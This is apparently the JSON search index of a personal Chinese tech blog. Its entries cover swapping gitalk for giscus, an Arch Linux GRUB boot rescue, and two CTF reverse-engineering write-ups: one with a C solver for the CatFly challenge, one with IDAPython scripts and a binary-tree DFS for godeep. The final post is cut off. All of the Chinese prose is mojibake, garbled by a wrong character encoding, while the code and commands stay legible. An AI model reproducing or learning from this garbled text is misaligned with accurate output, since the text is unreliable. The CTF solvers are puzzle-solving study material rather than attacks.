[{"categories":["Life"],"content":"èµ·å› æ˜¯æ˜¨å¤©æ™šä¸ŠRXğŸ‘´çªç„¶è·Ÿæˆ‘è¯´ï¼šä½ çš„gitalkæ˜¯ä¸æ˜¯æœ‰ç‚¹é—®é¢˜ï¼Œæ€ä¹ˆè¦æˆ‘æ‰€æœ‰public repoçš„writeæƒé™ã€‚ å‰æ®µæ—¶é—´è£…gitalkçš„æ—¶å€™è¿˜æ²¡æ³¨æ„ï¼Œäºæ˜¯è¿™æ¬¡ä¸“é—¨å»æœäº†åŠå¤©ï¼Œæœ€ç»ˆå‘ç°æ²¡åŠæ³•ä¿®æ”¹æƒé™ã€‚å…·ä½“åŸå› æ˜¯github oauth appsæƒé™æ˜¯é»˜è®¤å…¨å¼€çš„ï¼Œä¸”æ— æ³•ä¿®æ”¹ï¼Œè€Œgitalkä¼¼ä¹åªèƒ½åŸºäºoauth appã€‚ï¼ˆè¯•äº†è¯•github appsæ²¡æˆåŠŸï¼Œä¸æ’é™¤æ˜¯æˆ‘çš„é—®é¢˜ï¼‰å¹¶ä¸”å»ç¿»äº†ç¿»ä¸€äº›ä½¿ç”¨gitalkçš„å…¶ä»–åšå®¢ï¼Œå‘ç°æ¸…ä¸€è‰²æ˜¯è¦æ‰€æœ‰æƒé™ï¼Œä¼°è®¡å¤šå°‘æœ‰ç‚¹å†å²åŸå› äº†ã€‚ è‡³æ­¤ï¼Œå†³å®šç»™gitalkæ‰¬äº†ã€‚RXğŸ‘´ç»™æˆ‘æ¨èäº†giscusï¼ŒğŸ‘´ä¸€çœ‹è¿™ä¸ªæœç„¶å¥½ï¼ŒåŸºäºgithub appsï¼Œæƒé™é™åˆ¶ä¸€æ¸…äºŒæ¥šï¼Œå¼€æ•´ï¼ ä½†æ˜¯ï¼Œå‡¡äº‹æ€»æœ‰ä½†æ˜¯ã€‚ğŸ‘´çš„ä¸»é¢˜å¹¶ä¸æ”¯æŒgiscusï¼Œæƒ³ç”¨å°±åªèƒ½è‡ªå·±å»æ”¹htmlã€‚æ¨¡æ¿æ–‡ä»¶ä¸å¤šï¼Œå¾ˆå®¹æ˜“æ‰¾åˆ°ï¼Œä»£ç ä¹Ÿå¾ˆå¥½å†™ï¼Œä½†æ˜¯æ”¾ä¸Šå»ä¸€çœ‹å‘ç°æ²¡è¿™ä¹ˆç®€å•ï¼Œå¸ƒå±€ç‚¸äº†ï¼Œè¯„è®ºæ¡†å äº†åŠä¸ªå±å¹•ã€‚ å¦‚æœğŸ‘´æ˜¯ä¸ªå‰ç«¯å¸¦å¸ˆï¼Œä¼°è®¡ä¸‰ä¸¤ä¸‹ç»™å®ƒæ”¶æ‹¾äº†ï¼Œä½†ğŸ‘´ä¸ä¼šå‰ç«¯ã€‚çœ‹äº†åŠå¤©æ–‡æ¡£ï¼Œå­¦åˆ°äº†ç‚¹go templateè¯­æ³•ï¼Œä½†è¿˜æ˜¯ä¸ä¼šæ”¹ã€‚ğŸ‘´æƒ³èµ·æ¥ä»å¼€å§‹ç”¨è¿™ä¸ªä¸»é¢˜ï¼Œå°±ä¸€ç›´åœ¨ä¿®ä¿®è¡¥è¡¥ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºæ¢äº†è¿‡æ—¶çš„jsåº“ã€æ‰¬äº†åºŸå¼ƒçš„ç‰¹æ€§ã€æ”¹äº†ä¸èƒ½ç”¨çš„é…ç½®ç­‰ç­‰ï¼Œæ¯•ç«Ÿä½œè€…çš„githubä»“åº“å·²ç»archiveå‡ å¹´äº†ã€‚å¿ƒä¸€æ¨ªè¯´ğŸ‘´è‡ªå·±å†™ä¸€ä¸ªä¸»é¢˜ç®—äº†ï¼Œäºæ˜¯åˆå»çœ‹äº†åŠå¤©hugoæ–‡æ¡£ã€‚ ä½†æ˜¯ï¼Œå‡¡äº‹æ€»ä¸æ­¢ä¸€ä¸ªä½†æ˜¯ã€‚ğŸ‘´åœ¨googleæŸ¥ä¸€ä¸ªä¸œè¥¿çš„æ—¶å€™çªç„¶è·³å‡ºæ¥äº†LoveItï¼Œçªç„¶ä¸€ä¸‹å­é¡¿æ‚Ÿäº†ï¼Œé˜»æŒ¡æˆ‘æœ€å¤§çš„å›°éš¾å¹¶ä¸æ˜¯ä»€ä¹ˆgo templateï¼Œå‰ç«¯è¯­æ³•ä¹‹ç±»çš„ï¼Œè€Œæ˜¯è®¾è®¡çš„çµæ„Ÿã€‚ çœŸå¿ƒå´‡æ‹œæ¯ä¸€ä¸ªæœ‰çµæ„Ÿã€ä¼šè®¾è®¡çš„äººã€‚ ä»¥ä¸Šï¼ŒLoveItï¼ ","date":"2023-01-05","objectID":"/2023/01/hello-loveit/:0:0","tags":["hugo-theme"],"title":"Hello, LoveIt","uri":"/2023/01/hello-loveit/"},{"categories":["Linux"],"content":"æˆ‘åªæƒ³æ‰¬äº†ç³»ç»Ÿæ›´æ–°æŠ¥é”™ åˆšå¼€å§‹å…¶å®å¹¶æ²¡æƒ³æŠ˜è…¾å†…æ ¸ï¼Œåªæ˜¯æƒ³è§£å†³ç³»ç»Ÿæ›´æ–°ä¸€äº›çœ‹ä¸æ‡‚çš„æŠ¥é”™ archlinuxåœ¨æ¯æ¬¡è¿›è¡Œç³»ç»Ÿæ›´æ–°æ—¶ï¼Œå¦‚æœæ¶‰åŠå†…æ ¸ç›¸å…³ï¼Œå°±ä¼šè§¦å‘pacmané’©å­ï¼Œè°ƒç”¨mkinitcpioè„šæœ¬é‡æ–°æ„å»ºå†…æ ¸é•œåƒï¼Œè¿™éƒ¨åˆ†è¯¦è§ https://wiki.archlinuxcn.org/wiki/Mkinitcpio ï¼ˆè¿™ä¹Ÿæ˜¯æˆ‘åœ¨æ’é”™æ—¶æ‰çŸ¥é“çš„ï¼‰ï¼Œä½†æˆ‘çš„æœºå™¨æ¯æ¬¡éƒ½ä¼šè¾“å‡ºå‡ è¡ŒErrorï¼Œçœ‹å¾—äººååˆ†ä¸çˆ½ï¼š ==\u003e ERROR: module not found: `nvidia' ==\u003e ERROR: module not found: `nvidia_modeset' ==\u003e ERROR: module not found: `nvidia_uvm' ==\u003e ERROR: module not found: `nvidia_drm' æœ‰è¿‡ä¹‹å‰ä¸¤æ¬¡æå´©æ˜¾å¡æ— æ³•å¼€æœºçš„ç»å†ï¼Œä»¥åŠä¸€åˆ‡éƒ½è¿˜èƒ½ç”¨ï¼Œä¹‹å‰ä¸€ç›´æ²¡ç®¡è¿‡å®ƒï¼Œä½†è¿™æ¬¡æƒ³åˆ¨æ ¹é—®åº•äº†ï¼Œç»è¿‡ä¸€æ®µæ—¶é—´googleï¼Œåœ¨archwikiä¸Šæ‰¾åˆ°äº†è¿™ä¸€ç¯‡æ–‡ç« ï¼Œé—®é¢˜å‡ ä¹å’Œæˆ‘ä¸€æ¨¡ä¸€æ ·ã€‚ æœ€åå‘ç°æˆ‘ä¹‹å‰ä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™å®‰è£…è¿‡linux-zenè¿™ä¸ªåŒ…ï¼ŒåŒæ—¶æˆ‘ä¸€ç›´åœ¨ä½¿ç”¨çš„æ˜¯linuxè¿™ä¸ªåŒ…çš„ä¸»çº¿å†…æ ¸ï¼Œåœ¨ä¸Šè¿°è°ƒç”¨mkinitcpioè„šæœ¬çš„è¿‡ç¨‹ä¸­ï¼Œä¼šåŒæ—¶å°è¯•æ„å»ºlinuxå’Œlinux-zenä¸¤ç§å†…æ ¸çš„é•œåƒï¼Œlinuxé•œåƒä¸€ç›´èƒ½å¤Ÿæ­£å¸¸æ„å»ºï¼Œå‡ºé—®é¢˜çš„åªæ˜¯linux-zené•œåƒçš„æ„å»ºã€‚ åˆ°è¿™åè€Œæ¿€èµ·äº†æˆ‘çš„å…´è¶£ï¼Œå»äº†è§£äº†ä¸€ä¸‹å„ç§å†…æ ¸ï¼Œè´´ä¸€ä¸ªarchwikiçš„ä»‹ç»ï¼Œå‘ç°linux-zenå†…æ ¸å¯èƒ½ä¼šæœ‰æ›´å¥½çš„æ€§èƒ½è¡¨ç°ï¼Œä¸”å¯¹wineçš„æŸäº›ä½“éªŒä¼šæœ‰è¾ƒå¤§çš„æå‡ã€‚äºæ˜¯æˆ‘æŠ±ç€å¥½å¥‡çš„å¿ƒæ€å‡†å¤‡æ¢ä¸ªå†…æ ¸ ","date":"2023-01-04","objectID":"/2023/01/grub%E5%BC%95%E5%AF%BC%E6%8A%A2%E6%95%91%E5%AE%9E%E5%BD%95/:1:0","tags":["linux","grub"],"title":"Archlinux Grubå¼•å¯¼æŠ¢æ•‘å®å½•","uri":"/2023/01/grub%E5%BC%95%E5%AF%BC%E6%8A%A2%E6%95%91%E5%AE%9E%E5%BD%95/"},{"categories":["Linux"],"content":"grubç›´æ¥è¿›biosåå¤é¬¼ç•œ å…ˆè£…å¥½äº†linux-zenå’Œlinux-zen-headersä¸¤ä¸ªåŒ…ï¼Œç„¶åä¸ºäº†è§£å†³ä¸Šé¢æ‰¾ä¸åˆ°nvidiaæ¨¡å—çš„é—®é¢˜éœ€è¦æŠŠnvidiaæ¢æˆnvidia-dkmsï¼Œè£…å®Œä¹‹åå°±æ²¡æœ‰ERRORäº† ç„¶åå°è¯•rebootè¿›å…¥zenå†…æ ¸ï¼Œå‘ç°grubèœå•å¹¶æ²¡æœ‰zenå†…æ ¸çš„é€‰é¡¹ï¼ŒæŸ¥äº†æŸ¥å‘ç°éœ€è¦é‡æ–°ç”Ÿæˆgrubé…ç½®ï¼Œå³sudo grub-mkconfig -o /boot/grub/grub.cfgã€‚ä»è¿™ï¼Œå™©æ¢¦å¼€å§‹ rebootä¹‹Welcome to grubä¸€é—ªè€Œè¿‡ï¼Œç„¶åç”µè„‘å…³æœºï¼Œå†å¼€æœºç›´æ¥è¿›å…¥äº†biosã€‚biosé‡Œé€‰æ‹©ç»§ç»­å¯åŠ¨ï¼Œå°±ä¼šé‡å¤ä¸Šé¢çš„åŠ¨ä½œï¼Œä¸€é—ªè€Œè¿‡ã€å…³æœºã€å¼€æœºã€è¿›biosï¼Œåå¤é¬¼ç•œ wikiä¸Šå‘ç°äº†å’Œæˆ‘ç›¸åŒçš„é­é‡ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰è§£å†³ï¼Œä¸äº†äº†ä¹‹äº†ã€‚åˆ°å¤„æœç´¢å‘ç°åŸºæœ¬éƒ½æ˜¯æ•™ä½ grubå¼•å¯¼å‡ºé”™è¿›å…¥grub shellè¯¥æ€ä¹ˆåŠï¼Œä½†æˆ‘èƒ½ç”¨çš„åªæœ‰biosï¼Œè¿èƒ½æ‰§è¡Œå‘½ä»¤çš„åœ°æ–¹éƒ½æ²¡æœ‰ã€‚å¦å¤–çš„åŠæ³•è¿˜å¯ä»¥ä½¿ç”¨è£…ç³»ç»Ÿçš„å¯åŠ¨ç›˜å¼•å¯¼å¯åŠ¨ï¼Œä½†æˆ‘æ‰‹è¾¹æ ¹æœ¬æ²¡æœ‰ï¼Œåªæœ‰ä¸€ä¸ªè£…åœ¨ç§»åŠ¨ç¡¬ç›˜é‡Œçš„windowsï¼Œå®ƒèƒ½æ•‘æˆ‘å—ï¼Ÿ ","date":"2023-01-04","objectID":"/2023/01/grub%E5%BC%95%E5%AF%BC%E6%8A%A2%E6%95%91%E5%AE%9E%E5%BD%95/:2:0","tags":["linux","grub"],"title":"Archlinux Grubå¼•å¯¼æŠ¢æ•‘å®å½•","uri":"/2023/01/grub%E5%BC%95%E5%AF%BC%E6%8A%A2%E6%95%91%E5%AE%9E%E5%BD%95/"},{"categories":["Linux"],"content":"windowsåˆ grubé…ç½®è¿›grub-shell åœ¨biosé€‰æ‹©ç§»åŠ¨ç¡¬ç›˜å¯åŠ¨æˆåŠŸäº†å¼€èµ·æ¥äº†windowsã€‚ç¬¬ä¸€æƒ³æ³•æ˜¯grub.cfgæœ‰é—®é¢˜ï¼Œæƒ³è¦ä¿®æ”¹grub.cfgï¼Œä½†å…¶å®è¿™ä¸ªæ–‡ä»¶åªèƒ½ç”¨sudo grub-mkconfig -o /boot/grub/grub.cfgç”Ÿæˆï¼Œä½†åœ¨windowsä¸Šæ˜¾ç„¶æ— æ³•æ‰§è¡Œå‘½ä»¤ã€‚ è¿™æ—¶çªç„¶æƒ³åˆ°å‰é¢çœ‹è¿‡å¾ˆå¤šè¯¯åˆ grub.cfgçš„è§£å†³æ–¹æ¡ˆï¼Œç›´æ¥æ­»é©¬å½“æ´»é©¬åŒ»ï¼Œä½¿ç”¨linuxReaderæŒ‚è½½äº†linuxçš„ç¡¬ç›˜ï¼Œç»™grub.cfgæ‰¬äº†ã€‚é‡æ–°rebootæˆåŠŸè¿›å…¥äº†grub shellï¼Œä½†è¿™æ—¶æˆ‘ä¹Ÿå‘ç°äº†å¦ä¸€ä¸ªé—®é¢˜ï¼šæˆ‘è¿›ä¸äº†biosäº†ã€‚è¿™æ„å‘³ç€å¦‚æœæˆ‘æ— æ³•åœ¨grub shellè§£å†³é—®é¢˜ï¼Œææ€•å°±åªèƒ½é‡è£…ç³»ç»Ÿäº† ","date":"2023-01-04","objectID":"/2023/01/grub%E5%BC%95%E5%AF%BC%E6%8A%A2%E6%95%91%E5%AE%9E%E5%BD%95/:3:0","tags":["linux","grub"],"title":"Archlinux Grubå¼•å¯¼æŠ¢æ•‘å®å½•","uri":"/2023/01/grub%E5%BC%95%E5%AF%BC%E6%8A%A2%E6%95%91%E5%AE%9E%E5%BD%95/"},{"categories":["Linux"],"content":"æ‰‹åŠ¨å¼•å¯¼è¿›å…¥ç³»ç»Ÿä»¥åŠé‡è£…grub åˆæ˜¯æŸ¥äº†åŠå¤©ï¼Œå­¦ä¼šäº†å¦‚ä½•æ‰‹åŠ¨å¼•å¯¼ï¼Œarchwikiä¸Šæœ‰ç®€ç•¥çš„å‘½ä»¤å¯ä»¥å‚è€ƒï¼Œä½†å¦‚æœæƒ³æˆ‘ä¸€æ ·å¯¹linux``initrdç­‰å‘½ä»¤ä¸ç†Ÿæ‚‰è¿˜éœ€è¦å¤šæŸ¥æŸ¥æ‰èƒ½ææ˜ç™½ã€‚å…¶ä¸­éœ€è¦é¿å‘çš„æ˜¯æœ‰äº›æ–‡ç« æ—¶é—´ä¹…è¿œï¼Œå†™çš„æ˜¯grub1çš„å‘½ä»¤ï¼Œè€Œç°åœ¨å¤§å®¶ç”¨çš„åŸºæœ¬éƒ½æ˜¯grub2ï¼Œgrub1çš„å‘½ä»¤è¯¸å¦‚root``kernelç­‰åœ¨grub2ä¸­è¢«å¯ç”¨æˆ–æ›¿ä»£ è¿™é‡Œæ”¾ä¸€ç¯‡æ¯”è¾ƒè¯¦ç»†çš„ä»‹ç»ï¼Œçœ‹å®ŒåŸºæœ¬å°±èƒ½ç†è§£å¦‚ä½•ä½¿ç”¨è¿™å‡ æ¡å‘½ä»¤äº†ï¼Œåœ¨è¿™å°±ä¸èµ˜è¿°ã€‚è‡³æ­¤ï¼Œæˆ‘çš„archç»ˆäºæ´»è¿‡æ¥äº†ï¼ŒæˆåŠŸè¿›å…¥ç³»ç»Ÿã€‚ è‡³äºå¦‚ä½•ä¿®å¤grubï¼Œç”±äºæˆ‘æ²¡æœ‰è€å¿ƒå»çœ‹grubçš„æ–‡æ¡£äº†ï¼Œç´¢æ€§é‡è£…ã€‚é‡æ–°å®‰è£…äº†grubåŒ…ï¼Œç„¶åé‡æ–°æ‰§è¡Œäº†sudo grub-install --target=x86_64-efi --efi-directory=/boot/efi --bootloader-id=archlinuxï¼Œç„¶åç”Ÿæˆé…ç½®æ–‡ä»¶sudo grub-mkconfig -o /boot/grub/grub.cfgã€‚rebootä¹‹åæˆåŠŸè¿›å…¥äº†grubèœå•ï¼Œå¹¶èƒ½å¤Ÿé€‰æ‹©linuxå’Œlinux-zenå†…æ ¸ã€‚ åˆ°åº•grubä¸ºä»€ä¹ˆä¼šå‡ºé”™ä¸æƒ³å†æ·±ç©¶äº†ï¼Œæ€»æœ‰å¾ˆå¤šç„å­¦é—®é¢˜æ²¡æœ‰ç­”æ¡ˆã€‚ ","date":"2023-01-04","objectID":"/2023/01/grub%E5%BC%95%E5%AF%BC%E6%8A%A2%E6%95%91%E5%AE%9E%E5%BD%95/:4:0","tags":["linux","grub"],"title":"Archlinux Grubå¼•å¯¼æŠ¢æ•‘å®å½•","uri":"/2023/01/grub%E5%BC%95%E5%AF%BC%E6%8A%A2%E6%95%91%E5%AE%9E%E5%BD%95/"},{"categories":["Linux"],"content":"é¢˜å¤–è¯ æ·±åˆ»åœ°æ„Ÿå—åˆ°äº†archç¤¾åŒºçš„å¼ºå¤§ã€wikiçš„ç»†è‡´ èƒ½å¤Ÿè‡ªå·±åŠ¨æ‰‹ä¸€æ­¥æ­¥æ¢ç´¢ã€è§£å†³é—®é¢˜ï¼Œç®—æ˜¯ç»ˆäºæˆäº†ä¸€ä¸ªåˆæ ¼çš„archç”¨æˆ· ","date":"2023-01-04","objectID":"/2023/01/grub%E5%BC%95%E5%AF%BC%E6%8A%A2%E6%95%91%E5%AE%9E%E5%BD%95/:5:0","tags":["linux","grub"],"title":"Archlinux Grubå¼•å¯¼æŠ¢æ•‘å®å½•","uri":"/2023/01/grub%E5%BC%95%E5%AF%BC%E6%8A%A2%E6%95%91%E5%AE%9E%E5%BD%95/"},{"categories":["WriteUps"],"content":"æŒºæœ‰æ„æ€çš„ä¸€é“é¢˜ï¼Œæœ¬èº«ä¸ç®—éš¾ï¼Œä½†æœ€ååŠ ä¸Šæˆ‘åªæœ‰4è§£è¿˜æ˜¯æŒºæƒŠè®¶ é¢˜ç›®æ˜¯ä¸ªå‘½ä»¤è¡Œå°æ¸¸æˆï¼Œè¿è¡Œèµ·æ¥å¯ä»¥çœ‹åˆ°å±å¹•çš„ç¬¬ä¸€è¡Œä¼šä¸€ç›´æ‰“å°ä¸€äº›å­—ç¬¦ï¼Œä½†ä»”ç»†çœ‹éƒ½æ˜¯ä¹±ç  ä¼ªä»£ç å†…å®¹æ¯”è¾ƒæ¸…æ™°ï¼Œå¤§æ®µéƒ½æ˜¯å…³äºå‘½ä»¤è¡Œå‚æ•°ã€ä¸åŒç»ˆç«¯çš„å¤„ç†ä¹‹ç±»çš„ä¸œè¥¿ï¼Œé‡ç‚¹å†…å®¹å¦‚ä¸‹ï¼š while ( v13 ) { if ( dword_E104 ) printf(\"\\x1B[H\"); else printf(\"\\x1B[u\"); for ( screen_row = top; screen_row \u003c bottom; ++screen_row ) { for ( screen_col = left; screen_col \u003c right; ++screen_col ) { if ( screen_row \u003c= 23 || screen_row \u003e 42 || screen_col \u003e= 0 ) { if ( screen_col \u003e= 0 \u0026\u0026 (unsigned int)screen_row \u003c= 0x3F \u0026\u0026 screen_col \u003c= 63 ) { v19 = screen[screen_cnt][screen_row][screen_col]; off_FA88 = sub_6314((unsigned int)screen_cnt, screen_row, screen_col, (__int64)v12); } else { v19 = 44; } } else { v18 = (2 - screen_col) % 16 / 8; if ( ((screen_cnt \u003e\u003e 1) \u0026 1) != 0 ) v18 = 1 - v18; s[128] = (__int64)\",,\u003e\u003e\u0026\u0026\u0026+++###==;;;,,\"; v19 = asc_BFE3[v18 - 23 + screen_row]; if ( !v19 ) v19 = 44; } if ( v25 ) { printf(\"%s\", *((const char **)\u0026unk_FCC0 + v19)); } else if ( v19 == v22 || !*((_QWORD *)\u0026unk_FCC0 + v19) ) { printf(\"%s\", off_FA88); } else { v22 = v19; printf(\"%s%s\", *((const char **)\u0026unk_FCC0 + v19), off_FA88); } } sub_65E2(1LL); } if ( dword_E100 ) { time(\u0026time1); v11 = difftime(time1, timer); v10 = sub_63FF((unsigned int)(int)v11); for ( n = (dword_E1FC - 29 - v10) / 2; n \u003e 0; --n ) putchar(' '); key += printf(\"\\x1B[1;37mYou have nyaned for %d times!\\x1B[J\\x1B[0m\", (unsigned int)++dword_108E0); } v22 = 0; ++frame_count; if ( frames \u0026\u0026 frame_count == frames ) quit(); if ( !screen[++screen_cnt] ) screen_cnt = 0LL; usleep(1000 * v27); } char *__fastcall sub_6314(__int64 a1, int a2, int a3, __int64 a4) { if ( a2 != 18 ) return (char *)a4; if ( a3 \u003c= 4 || a3 \u003e 54 ) return (char *)a4; byte1 = 32; enc[a3 - 5] ^= cal_key(); if ( is_printable_char(enc[a3 - 5]) ) byte2 = enc[a3 - 5] \u0026 0x7F; else byte2 = 32; return \u0026byte2; } __int64 cal_key() { key = 1103515245 * key + 12345; return (key \u003e\u003e 10) \u0026 0x7FFF; } å¯ä»¥çœ‹å‡ºè¿™å°±æ˜¯æ›´æ–°å±å¹•æ˜¾ç¤ºå†…å®¹çš„é€»è¾‘ï¼Œæˆ‘ä»¬å…³å¿ƒçš„æ˜¯ç¬¬ä¸€è¡Œé‚£ä¸€ä¸²å­—ç¬¦ï¼Œäº§ç”Ÿè¿™äº›å­—ç¬¦çš„é€»è¾‘åœ¨sub_6314ï¼Œç»“åˆè¿™ä¸ªå‡½æ•°å†…çš„ifé™åˆ¶å¯ä»¥å¾—åˆ°ï¼Œåªæœ‰$screen_row = 18 ä¸” screen_col \\in [5, 54]$æ—¶æ‰ä¼šçœŸæ­£äº§ç”Ÿå­—ç¬¦ï¼Œå³ç”»é¢ä¸­å­—ç¬¦çš„ä½ç½® è€Œå­—ç¬¦çš„å…·ä½“å€¼æ˜¯ç”±encæ•°ç»„å’Œkeyçš„å€¼è®¡ç®—è€Œæ¥çš„ï¼Œç»“åˆhintè¯´è¦æŠ„å†™è¿™ä¸ªç®—æ³•è·‘ä¸€åˆ†é’Ÿå°±èƒ½å‡ºflagï¼Œæœ€ç»ˆexpï¼š #include \u003cstdio.h\u003e #include \u003cstring.h\u003e unsigned int key = 0x1106; unsigned int cal_key() { key = (0x41C64E6D * key + 12345) \u0026 0xffffffff; return (((int)key \u003e\u003e 10) \u0026 0x7fff); } int cal_digit(int num) { int digit = 0; while(num) { num /= 10; digit++; } return digit; } int main() { int cnt = 0; unsigned char flag[50]; unsigned int enc[] = { 0x27FB, 0x27A4, 0x464E, 0x0E36, 0x7B70, 0x5E7A, 0x1A4A, 0x45C1, 0x2BDF, 0x23BD, 0x3A15, 0x5B83, 0x1E15, 0x5367, 0x50B8, 0x20CA, 0x41F5, 0x57D1, 0x7750, 0x2ADF, 0x11F8, 0x09BB, 0x5724, 0x7374, 0x3CE6, 0x646E, 0x010C, 0x6E10, 0x64F4, 0x3263, 0x3137, 0x00B8, 0x229C, 0x7BCD, 0x73BD, 0x480C, 0x14DB, 0x68B9, 0x5C8A, 0x1B61, 0x6C59, 0x5707, 0x09E6, 0x1FB9, 0x2AD3, 0x76D4, 0x3113, 0x7C7E, 0x11E0, 0x6C70}; while(1) { for (int i = 0; i \u003c 50; i++) { enc[i] ^= cal_key(key); if (((enc[i] \u0026 127) \u003e 32) \u0026\u0026 ((enc[i] \u0026 127) \u003c= 126)) { flag[i] = enc[i] \u0026 127; } else { flag[i] = ' '; } } if (!strncmp(flag, \"CatCTF\", 6)) { puts(flag); return 0; } cnt++; key += 41; // keyè¦åŠ ä¸Šprintfçš„è¿”å›å€¼ key += cal_digit(cnt); } } ä¸ºäº†èŠ‚çœè¿ç®—æ—¶é—´ï¼Œä»£ç ä¸­åšäº†ä¸€äº›çœç•¥ï¼Œå’Œè®¡ç®—å­—ç¬¦ä¸²æ— å…³çš„ä»£ç ï¼Œæ¯”å¦‚screen_rowå’Œscreen_colçš„ä¸¤ä¸ªå¤–å±‚å¾ªç¯ç›´æ¥æ‰¬äº† éœ€è¦æ³¨æ„æ¯æ¬¡forå¾ªç¯ç»“æŸä¹‹åï¼Œkeyçš„å€¼è¦åŠ ä¸Šprintfå‡½æ•°çš„è¿”å›å€¼ï¼Œå³è¾“å‡ºçš„å­—ç¬¦æ•° è¸©åˆ°çš„å¦å¤–ä¸€ä¸ªå‘ï¼šåˆšå¼€å§‹æƒ³æ³•å°†æ‰€æœ‰å­—ç¬¦è¾“å‡ºåˆ°ä¸€ä¸ªæ–‡ä»¶é‡Œï¼Œç„¶åç»“åˆgrepå»æ‰¾æœ‰ç”¨çš„å­—ç¬¦ä¸²ï¼Œç†è®ºå¯è¡Œï¼Œä½†ä¸€åˆ†é’Ÿè·‘å‡ºæ¥å°±å…¨æ˜¯ä¹±ç ï¼Œè¿˜ä»¥ä¸ºæ˜¯ç®—æ³•å†™å¾—æœ‰é—®é¢˜ã€‚æœ€ååˆå°è¯•äº†ä¸€éï¼Œç¨‹åºä¸€åˆ†åŠä¹Ÿæ²¡è·‘å‡ºç»“æœï¼Œè¾“å‡ºæ–‡ä»¶å·²ç»è¾¾åˆ°äº†4.7Gï¼Œä½¿ç”¨grepæç¤ºå†…å­˜è€—å°½ï¼Œæ–‡æœ¬ç¼–è¾‘å™¨å°è¯•æ‰“å¼€ç›´æ¥å´©æºƒï¼Œè¿˜æ˜¯æŒºå“äººçš„ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥çœ‹å‡ºå¦‚printfç­‰è¾“å‡ºå‡½æ•°å¯¹ç¨‹åºè¿è¡Œæ•ˆç‡çš„é™ä½éå¸¸å¤§ã€‚ æœ€ç»ˆflagï¼šCatCTF{Fly1NG_NyAnC4t_Cha5eS_the_FL4G_in_The_Sky} ","date":"2023-01-01","objectID":"/2023/01/catctf-catfly-wp/:0:0","tags":["CTF","reverse"],"title":"NepnepxCatCTF Reverse CatFly WriteUp","uri":"/2023/01/catctf-catfly-wp/"},{"categories":["WriteUps"],"content":"è¿™åœºæ¯”èµ›å”¯ä¸€æœ‰æ„ä¹‰çš„ä¸€é“é€†å‘é¢˜ï¼Œéœ€è¦ç†Ÿæ‚‰idapythonçš„apiï¼Œå¹¶è¦æ±‚ä¸€å®šæ•°æ®ç»“æ„çŸ¥è¯†ï¼Œåœ¨è¿™è´´å‡ ä¸ªè„šæœ¬æ–¹ä¾¿ä»¥åå¯èƒ½ç”¨åˆ° æ•´ä¸ªé¢˜ç›®å°±æ˜¯åœ¨æ¢ç´¢è·¯å¾„ï¼ŒåŠ¨è°ƒå¾—çŸ¥main_convertä¼šæŠŠè¾“å…¥è½¬æ¢æˆäºŒè¿›åˆ¶01æ•°ç»„ï¼Œç„¶åæ ¹æ®01èµ°ç›¸åº”çš„åˆ†æ”¯ï¼Œä¸€ä¸ªç‚¹å¾€åå¯¹åº”ä¸¤æ¡è·¯ï¼Œç›¸å½“äºè¦å»ºä¸€ä¸ªäºŒå‰æ ‘ ç»™èŠ‚ç‚¹æ”¹ä¸ªåå…ˆ start = 0x401000 end = 0x583400 index = 0 for i in range(start, end): if \"godeep_tree.\" in get_name(i): set_name(i, \"node\"+str(index)) index += 1 æ€»å…±5672ä¸ªèŠ‚ç‚¹ï¼Œè·å–æ‰€æœ‰èŠ‚ç‚¹å’Œè¾¹ from idaapi import * from idc import * start = 0x401000 end = 0x583400 out = open(\"out.txt\", \"w\") for i in range(start, end): parent = get_name(i) if parent[0:4] != \"node\": continue out.write(parent[4:]+\" \") j = i f = False child = GetDisasm(j) last = \"\" while child != \"retn\": if last == child: j += 1 child = GetDisasm(j) continue if child == 'call node5672': if f: out.write(child[child.find('e')+1:] +\" \") else: f = True elif 'call node' in child: out.write(child[child.find('e')+1:]+\" \") elif 'wrong' in child: out.write(\"wrong \") elif 'right' in child: out.write(\"right \") last = child j += 1 child = GetDisasm(j) out.write('\\n') å»ºç«‹äºŒå‰æ ‘+dfsæ±‚è·¯å¾„ from Crypto.Util.number import * file = open(\"out.txt\", \"r\") dic = dict() class TreeNode: def __init__(self, id): self.id = id self.state = True self.flag = False self.left = None self.right = None root = TreeNode(9999) node0 = TreeNode(0) root.left = node0 dic[0] = node0 for i in file.readlines(): parent = eval(i.split()[0]) parent_node = TreeNode(parent) if dic.get(parent) != None: parent_node = dic.get(parent) else: dic[parent] = parent_node if i.split()[1] == 'wrong': parent_node.state = False continue if i.split()[1] == 'right': parent_node.flag = True continue if len(i.split()) == 2: left_node = TreeNode(eval(i.split()[1])) dic[eval(i.split()[1])] = left_node parent_node.left = left_node elif len(i.split()) == 3: left_node = TreeNode(eval(i.split()[1])) dic[eval(i.split()[1])] = left_node parent_node.left = left_node right_node = TreeNode(eval(i.split()[2])) dic[eval(i.split()[2])] = right_node parent_node.right = right_node path = [] def dfs(parent): if parent.flag: print(path) print(long_to_bytes(eval(\"0b\"+\"\".join(str(i) for i in path).removeprefix('1')))) exit() if not parent.state: return if parent.left: path.append(1) dfs(parent.left) path.pop(-1) if parent.right: path.append(0) dfs(parent.right) path.pop(-1) dfs(root) print(\"no answer\") print(path) flag{fc03bd97-ff7b-419f-8987-78bc745d3b0a} ","date":"2022-12-26","objectID":"/2022/12/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9Bgodeep-wp/:0:0","tags":["ctf","reverse"],"title":"æ˜¥ç§‹æ¯å†¬å­£èµ›godeep wp","uri":"/2022/12/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9Bgodeep-wp/"},{"categories":["Dev"],"content":"å¯æ‰§è¡Œæ–‡ä»¶ç›¸å…³ ","date":"2022-12-23","objectID":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/:1:0","tags":["executable","ssh"],"title":"å¯æ‰§è¡Œæ–‡ä»¶æ¦‚è¿°å’Œsshä½¿ç”¨ç®€ä»‹","uri":"/2022/12/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6ssh/"},{"categories":["Dev"],"content":"#ä»€ä¹ˆæ˜¯å¯æ‰§è¡Œæ–‡ä»¶ exeï¼ˆPEï¼‰æ–‡ä»¶ã€ELFæ–‡ä»¶ äºŒè¿›åˆ¶æ–‡ä»¶ 